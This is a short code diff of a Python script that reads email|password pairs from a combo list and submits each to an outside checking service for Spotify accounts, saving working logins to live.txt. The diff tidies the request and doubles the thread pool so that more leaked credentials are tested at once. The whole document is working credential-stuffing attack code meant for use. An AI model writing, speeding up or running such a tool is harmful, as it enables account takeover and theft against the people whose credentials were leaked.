@@ -16,13 +16,7 @@ pek=[]
 def crack(email):
 	global tol,til,pek
 	til+=1
-	req=requests.post(
-		"https://api.dw1.co/spotify/v2/check",data=
-			{
-				"email":email ,
-				"password":tol[til-1],
-			}
-	)
+	req=requests.post("https://api.dw1.co/spotify/v2/check",data={"email":email,"password":tol[til-1]})
 	if "true" in req.text:
 		pek.append(email)
 		open("live.txt","a+").write("%s|%s\n"%(email,tol[til-1]))
@@ -45,7 +39,7 @@ for x in o:
 	k=x.split("|")
 	tol.append(k[1])
 	pul.append(k[0])
-p=ThreadPool(5)
+p=ThreadPool(10)
 p.map(crack,pul)
 print("-"*30)
 print("[!] Live: %s"%(len(pek)))
